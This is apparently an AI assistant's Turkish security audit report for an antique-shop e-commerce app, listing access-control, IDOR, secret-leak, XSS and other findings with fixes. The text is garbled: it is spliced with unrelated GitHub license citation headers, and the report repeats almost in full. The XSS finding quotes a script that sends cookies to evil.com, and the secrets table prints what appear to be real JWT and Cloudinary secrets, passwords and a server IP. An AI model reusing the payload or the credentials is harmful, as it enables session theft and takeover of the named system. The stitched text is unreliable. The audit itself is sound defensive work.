            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        
```


## License: unknown
https://github.com/Aviortheking/games/blob/392a5f75cb70d467a0e001317f6ed236c48123bc/dzeio.next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        
```


## License: Apache-2.0
https://github.com/bettercollected/bettercollected/blob/488dc508c1e666fc17a9d35acf67feea15e8fb0b/webapp/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
